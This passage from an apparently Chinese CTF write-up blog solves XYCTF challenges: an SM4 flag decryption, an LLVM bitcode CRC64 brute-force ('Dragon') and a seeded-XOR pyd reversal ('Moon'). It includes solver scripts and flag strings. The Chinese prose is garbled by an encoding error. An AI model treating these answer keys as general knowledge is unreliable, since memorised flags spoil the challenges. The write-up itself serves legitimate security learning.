class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, binary)), <span class="hljs-number">2</span>)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">32</span>)<br>    <span class="hljs-keyword">return</span> hex_key.upper()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_flag</span>():<br>    <span class="hljs-comment"># ç”Ÿæˆå¯†é’¥</span><br>    sm4_key_hex = generate_sm4_key(KEY_EXPONENTS)<br>    sm4_key = binascii.unhexlify(sm4_key_hex)<br>    <br>    <span class="hljs-comment"># åˆå§‹åŒ– SM4 è§£å¯†å™¨</span><br>    cipher = sm4.CryptSM4()<br>    cipher.set_key(sm4_key, sm4.SM4_DECRYPT)<br>    <br>    <span class="hljs-comment"># è§£å¯†å¹¶ç§»é™¤å¡«å……</span><br>    ciphertext = binascii.unhexlify(CIPHER_TEXT_HEX)<br>    decrypted_padded = cipher.crypt_ecb(ciphertext)<br>    decrypted = unpad(decrypted_padded, <span class="hljs-number">16</span>)<br>    <br>    <span class="hljs-keyword">return</span> decrypted.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    flag = decrypt_flag()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decrypted Flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ° flag</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">XYCTF&#123;Crypt<span class="hljs-meta">o0</span>_ca<span class="hljs-symbol">n_n0</span>t_S<span class="hljs-meta">o1</span>ve_it&#125;<br></code></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Dragon"><a href="#Dragon" class="headerlink" title="Dragon"></a>Dragon</h2><p>ç¬¬ä¸€æ¬¡åšå…³äº LLVM çš„é¢˜ï¼Œä» 0 åˆ° 0.1 çš„é…ç¯å¢ƒwww</p><p>æ–°è£…çš„ Ubuntu24.04.02ï¼Œç”¨è¿™ä¸ªä¼ ä¸€ä¸‹æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/81b66c7e84b40f35.png"></p><p>æ‹¿åˆ° <code>Dragon.bc</code> æ–‡ä»¶ä¹‹åæŸ¥çœ‹æ–‡ä»¶ç±»å‹ï¼Œè¿˜èƒ½ç”¨ Exeinfo PE çœ‹ï¼Œä½†æ˜¯åªèƒ½å¾—åˆ°æ˜¯å…³äº LLVM çš„ï¼Œæ²¡æœ‰å…·ä½“ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">file Dragon.bc<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/2bb3847b1a687538.png"></p><p><code>Dragon.bc</code> æ–‡ä»¶ä¸º LLVM IR bitcode æ–‡ä»¶ï¼ŒLLVM å®Œæ•´ç¼–è¯‘æµç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">æºæ–‡ä»¶<span class="hljs-function"><span class="hljs-params">(.c<span class="hljs-regexp">/.cpp) -&gt; LLVM å‰ç«¯(clang) -&gt; LLVM IR(.ll/</span>.bc)</span> -&gt;</span> LLVM ä¸­ç«¯<span class="hljs-function"><span class="hljs-params">(opt)</span> -&gt;</span> ä¼˜åŒ–å IR -&gt; LLVM åç«¯<span class="hljs-function"><span class="hljs-params">(llc)</span> -&gt;</span> æ±‡ç¼–<span class="hljs-function"><span class="hljs-params">(.s)</span> -&gt;</span> æ±‡ç¼–å™¨ -&gt; ç›®æ ‡æ–‡ä»¶<span class="hljs-function"><span class="hljs-params">(.o)</span> -&gt;</span> é“¾æ¥å™¨ -&gt; å¯æ‰§è¡Œæ–‡ä»¶<br></code></pre></td></tr></table></figure><p>å°†  <code>bc</code> æ–‡ä»¶è½¬æ¢ä¸º object file</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">llc-17 Dragon.bc -filetype=obj -o Dragon.o<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/2e7042491fa0bfd9.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/e5bc7fc8daddfbab.png"></p><p>æ‹¿å‡ºæ¥ä¸¢è¿› ida åˆ†æï¼Œæ‰¾åˆ° main å‡½æ•°</p><p><img src="https://img.dkdun.cn/v1/2025/12/a833665883644667.png"></p><p>å¤§æ¦‚æ˜¯å°† <code>&amp;unk_370</code> çš„æ•°æ®å¤åˆ¶åˆ° <code>v7</code> æ•°ç»„ä¸­ï¼Œç„¶ååˆå§‹åŒ– Str æ•°ç»„ä¸º0ï¼Œæ¥ç€æç¤ºç”¨æˆ·è¾“å…¥flagï¼Œå¹¶è¯»å–è¾“å…¥åˆ° <code>Str</code>ä¸­</p><p>main å‡½æ•°ä¸­è¿˜æœ‰ä¸€ä¸ª <code>calculate_crc64_direct()</code> å‡½æ•°</p><p><img src="https://img.dkdun.cn/v1/2025/12/85cc1c5a6a8741c9.png"></p><p>æ ¹æ®ä»£ç ä¸­çš„ <code>0x42F0E1EBA9EA3693</code> çŸ¥é“å®ç°çš„æ˜¯ <code>CRC64</code> ç®—æ³•ï¼Œåˆå§‹å€¼ä¸º <code>0xFFFFFFFFFFFFFFFF</code>ï¼Œè¾“å…¥æ•°æ®æ¯ä¸ªå­—èŠ‚è¢«å·¦ç§» 56 ä½åä¸å½“å‰ CRC å€¼å¼‚æˆ–ï¼Œç„¶åå¤„ç†æ¯ä¸ªä½ï¼Œæœ€é«˜ä½å†³å®šæ˜¯å¦å¼‚æˆ–å¤šé¡¹å¼ï¼Œå¤„ç†å®Œæ‰€æœ‰ä½åï¼Œæœ€ç»ˆç»“æœå–åã€‚CRC ç®—æ³•æœ‰ä¸¤ç§å¤„ç†æ–¹å¼ï¼šå·¦ç§»ï¼ˆbig-endianï¼‰æˆ–å³ç§»ï¼ˆlittle-endianï¼‰ï¼Œæ ¹æ®å‡½æ•°ä¸­ <code>a1[i] &lt;&lt; 56</code> çŸ¥é“è¿™é‡Œæ˜¯å·¦ç§»</p><p>æ‰¾åˆ° <code>&amp;unk_370</code> çš„æ•°æ®</p><p><img src="https://img.dkdun.cn/v1/2025/12/b95a153f881fcc1b.png"></p><p>æŠŠæ•°æ®æå–å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">47h, 7Bh, 9Fh, 41h, 4Eh, 0E3h, 63h, 0DCh, 0C6h, 0BFh, 0B2h, 0E7h, 0D4h, 0F8h, 1Eh, <span class="hljs-number">3</span>, 9Eh, 0D8h, 5Fh, 62h, 0BCh, 2Fh, 0D6h, 12h, 0E8h, 55h, 57h, 0CCh, 0E1h, 0B6h, 0E8h, 83h, 0CCh, 65h, 0B6h, 2Ah, 0EBh, 0B1h, 7Bh, 0FCh, 6Bh, 0D9h, 62h, 2Ah, 1Bh, 0CAh, 82h, 93h, 87h, 0C3h, 73h, 76h, 0A0h, 0F8h, 0FFh, 0B1h, 0E1h, <span class="hljs-number">5</span>, 8Eh, 38h, 27h, 16h, 0A8h, 0Dh, 0B7h, 0AAh, 0D0h, 0E8h, 1Ah, 0E6h, 0F1h, 9Eh, 45h, 61h, 0F2h, 0E7h, 0D2h, 3Fh, 78h, 92h, 0Bh, 0E6h, 6Fh, 0F5h, 0A1h, 7Ch, 0C9h, 63h, 0ABh, 3Ah, 0B7h, 43h, 0B0h, 0A8h, 0D3h, 9Bh<br><br>è½¬ä¸ºåå…­è¿›åˆ¶ -&gt;<br><br><span class="hljs-number">0x47</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xDC</span>,<br><span class="hljs-number">0xC6</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x03</span>,<br><span class="hljs-number">0x9E</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x12</span>,<br><span class="hljs-number">0xE8</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x83</span>,<br><span class="hljs-number">0xCC</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xFC</span>,<br><span class="hljs-number">0x6B</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x93</span>,<br><span class="hljs-number">0x87</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xB1</span>,<br><span class="hljs-number">0xE1</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x0D</span>,<br><span class="hljs-number">0xB7</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x9E</span>,<br><span class="hljs-number">0x45</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x92</span>,<br><span class="hljs-number">0x0B</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x63</span>,<br><span class="hljs-number">0xAB</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x9B</span><br></code></pre></td></tr></table></figure><p>æ­£å‘å·¦ç§»é‚£ä¹ˆé€†å‘å°±éœ€è¦å³ç§»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><br>hex_data = [<br>    <span class="hljs-number">0x47</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xDC</span>,<br>    <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x03</span>,<br>    <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x12</span>,<br>    <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x83</span>,<br>    <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xFC</span>,<br>    <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x93</span>,<br>    <span class="hljs-number">0x87</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xB1</span>,<br>    <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x0D</span>,<br>    <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x9E</span>,<br>    <span class="hljs-number">0x45</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x92</span>,<br>    <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x63</span>,<br>    <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x9B</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_crc64</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-comment"># CRC64ç®—æ³•å®ç°</span><br>    crc = <span class="hljs-number">0xFFFFFFFFFFFFFFFF</span><br>    poly = <span class="hljs-number">0x42F0E1EBA9EA3693</span><br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        crc ^= (byte &lt;&lt; <span class="hljs-number">56</span>)<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            <span class="hljs-keyword">if</span> crc &amp; (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">63</span>):<br>                crc = ((crc &lt;&lt; <span class="hljs-number">1</span>) ^ poly) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFF</span><br>            <span class="hljs-keyword">else</span>:<br>                crc = (crc &lt;&lt; <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> (~crc) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_flag</span>():<br>    <span class="hljs-comment"># è½¬æ¢ç›®æ ‡æ ¡éªŒå€¼ï¼ˆå°ç«¯åºï¼‰</span><br>    targets = [<br>        <span class="hljs-built_in">int</span>.from_bytes(<span class="hljs-built_in">bytes</span>(hex_data[i:i+<span class="hljs-number">8</span>]), <span class="hljs-string">&#x27;little&#x27;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">96</span>, <span class="hljs-number">8</span>)<br>    ]<br>    <br>    <span class="hljs-comment"># æš´åŠ›ç ´è§£</span><br>    <span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm  <span class="hljs-comment"># è¿›åº¦æ¡åº“</span><br>    <br>    flag = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> idx, target <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(targets, <span class="hljs-number">1</span>):<br>        found = <span class="hljs-literal">False</span><br>        <span class="hljs-comment"># éå†æ‰€æœ‰å¯èƒ½çš„2å­—èŠ‚ç»„åˆ</span><br>        <span class="hljs-keyword">for</span> b1, b2 <span class="hljs-keyword">in</span> tqdm(itertools.product(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>), repeat=<span class="hljs-number">2</span>), <br>                          desc=<span class="hljs-string">f&quot;ç ´è§£ç¬¬<span class="hljs-subst">&#123;idx&#125;</span>ä¸ªæ ¡éªŒå€¼&quot;</span>, total=<span class="hljs-number">65536</span>):<br>            data = <span class="hljs-built_in">bytes</span>([b1, b2])<br>            <span class="hljs-keyword">if</span> calculate_crc64(data) == target:<br>                flag.extend(data)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[+] åŒ¹é…æˆåŠŸï¼š<span class="hljs-subst">&#123;data&#125;</span> â†’ <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(target)&#125;</span>&quot;</span>)<br>                found = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[-] æœªæ‰¾åˆ°åŒ¹é…é¡¹ï¼š<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(target)&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nflagï¼š&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;UTF-8:&quot;</span>, flag.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;replace&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;HEX   :&quot;</span>, flag.<span class="hljs-built_in">hex</span>())<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    find_flag()<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/304e1a4aaac8da5c.png"></p><p>æ‹¿åˆ° flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;LLVM_1s_Fun_Ri9h7?&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Moon"><a href="#Moon" class="headerlink" title="Moon"></a>Moon</h2><p>è¿™é¢˜è™½ç„¶æ˜¯ <code>pyd</code> é€†å‘ï¼Œä½†åº”è¯¥æ˜¯æœ€ç®€å•çš„é‚£ä¸€ç±»</p><p>shift+f12 æœç´¢å­—ç¬¦ä¸²ï¼Œå‰é¢æœ‰ä¸€äº›æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/dce64ef35887afcb.png"></p><p>å¾€ä¸‹çœ‹èƒ½å‘ç°ä¸€ä¸²å¯ç–‘å­—ç¬¦ä¸² </p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">426</span>b87abd0ceaa3c58761bbb0172606dd8ab064491a2a76af9a93e1ae56fa<span class="hljs-number">84206a2f7</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5c5179cbd58daed5.png"></p><p>è·Ÿè¿›å®šä½åˆ° <code>sub_180002550()</code> å‡½æ•°</p><p><img src="https://img.dkdun.cn/v1/2025/12/ee0a1d52877ac94b.png"></p><p>æŠŠé‡Œé¢å…³é”®å­—ç¬¦ä¸²æå–å‡ºæ¥ï¼š</p><p>åŠ å¯†ç›¸å…³ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">v9[<span class="hljs-number">1</span>] <span class="hljs-operator">=</span> <span class="hljs-string">&quot;426b87abd0ceaa3c58761bbb0172606dd8ab064491a2a76af9a93e1ae56fa84206a2f7&quot;</span><span class="hljs-comment">;</span><br><span class="hljs-attribute">v80</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;encrypted&quot;</span><span class="hljs-comment">;</span><br><span class="hljs-attribute">v179</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xor_crypt&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>æ¨¡å—åŠ è½½ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">v14</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SEED&quot;</span><br><span class="hljs-attribute">v20</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;TARGET_HEX&quot;</span><br><span class="hljs-attribute">v135</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;randint&quot;</span><br><span class="hljs-attribute">v141</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;random&quot;</span>    // ä½¿ç”¨Python randomæ¨¡å—<br><span class="hljs-attribute">v146</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;seed&quot;</span>      <br><span class="hljs-attribute">v152</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;seed_value&quot;</span>      // éšæœºæ•°ç§å­é…ç½®<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰ <code>xor</code> åŠ å¯†ï¼Œç»§ç»­çœ‹èƒ½åœ¨ <code>sub_180001370()</code> å‡½æ•°æ‰¾åˆ°äº†å…³äº <code>Xor</code> çš„ä¿¡æ¯ï¼Œæœ‰ä¸€ä¸ª <code>PyNumber_Xor()</code> ï¼Œå°† <code>v4</code>  å’Œ <code>v8</code> å¼‚æˆ–è¿”å› <code>v5</code>ï¼Œç„¶åå°† <code>v5</code> æ·»åŠ åˆ° list ä¸­</p><p><img src="https://img.dkdun.cn/v1/2025/12/8e9648d0940a93f4.png"></p><p>ä»”ç»†åˆ†æ <code>sub_180001370()</code> å‡½æ•°ä¸­çš„ <code>v8</code> æ¥æºï¼š</p><p><img src="https://img.dkdun.cn/v1/2025/12/edc4e1380303b4cb.png"></p><p>è¿™é‡Œé€šè¿‡ <code>PyDict_GetItem_KnownHash</code> ä» <code>off_18000B618</code> æŒ‡å‘çš„å­—å…¸ä¸­è·å–é¡¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Item_KnownHash = PyDict_GetItem_KnownHash(*off_18000B618, v11, *(v11 + <span class="hljs-number">24</span>));<br></code></pre></td></tr></table></figure><p>é€šè¿‡ä»£ç å¯ä»¥å‘ç° <code>v8</code> çš„æ ¸å¿ƒæ¥æºæ˜¯ <code>off_18000B618</code> æŒ‡å‘çš„æ¨¡å—å…¨å±€å­—å…¸</p><p>ç„¶åäº¤å‰å¼•ç”¨ <code>off_18000B618</code> å‘ç°è¢« <code>sub_180003010()</code> å‡½æ•°å¤šæ¬¡å¼•ç”¨</p><p><img src="https://img.dkdun.cn/v1/2025/12/6ed655fdf91ec8a5.png"></p><p>è·Ÿè¿›æ¥åˆ° <code>sub_180003010()</code> å‡½æ•°ï¼Œåœ¨ <code>PyLong_FromLong()</code>  å‡½æ•°ä¸­æ‰¾åˆ°äº†éšæœºæ•°ç§å­ <code>1131796</code>ï¼Œè¿™ä¸ª <code>PyLong_FromLong()</code> å‡½æ•°æ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œä¸»è¦æ˜¯å¯¹æ•°å€¼è¿›è¡Œå¤„ç†</p><p><img src="https://img.dkdun.cn/v1/2025/12/ab2e4aa482937b76.png"></p><p>å› æ­¤å¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">å¯†æ–‡ï¼š<span class="hljs-number">426</span>b87abd0ceaa3c58761bbb0172606dd8ab064491a2a76af9a93e1ae56fa<span class="hljs-number">84206a2f7</span><br>åŠ å¯†çš„éšæœºæ•°ç§å­å€¼ï¼š<span class="hljs-number">1131796</span><br>åŠ å¯†æ–¹å¼ï¼šå¼‚æˆ–<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ç¨‹åºä¸»è¦é€†å‘é€»è¾‘ï¼šä½¿ç”¨å›ºå®šçš„éšæœºæ•°ç§å­ <code>1131796</code>ï¼Œç”Ÿæˆå’Œå¯†æ–‡é•¿åº¦ä¸€æ ·çš„å¯†é’¥ç„¶åå†å’Œå¯†æ–‡å¼‚æˆ–å¾—åˆ°æ˜æ–‡</p><p>é€†å‘è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br><span class="hljs-comment"># è®¾ç½®å›ºå®šç§å­</span><br>random.seed(<span class="hljs-number">1131796</span>)<br><br><span class="hljs-comment"># å¯†æ–‡ï¼ˆ64å­—èŠ‚HEXå­—ç¬¦ä¸²ï¼‰</span><br>encrypted_hex = <span class="hljs-string">&quot;426b87abd0ceaa3c58761bbb0172606dd8ab064491a2a76af9a93e1ae56fa84206a2f7&quot;</span><br>encrypted_bytes = <span class="hljs-built_in">bytes</span>.fromhex(encrypted_hex)<br><br><span class="hljs-comment"># ç”Ÿæˆç­‰é•¿éšæœºå¯†é’¥</span><br>key = [random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encrypted_bytes))]<br><br><span class="hljs-comment"># 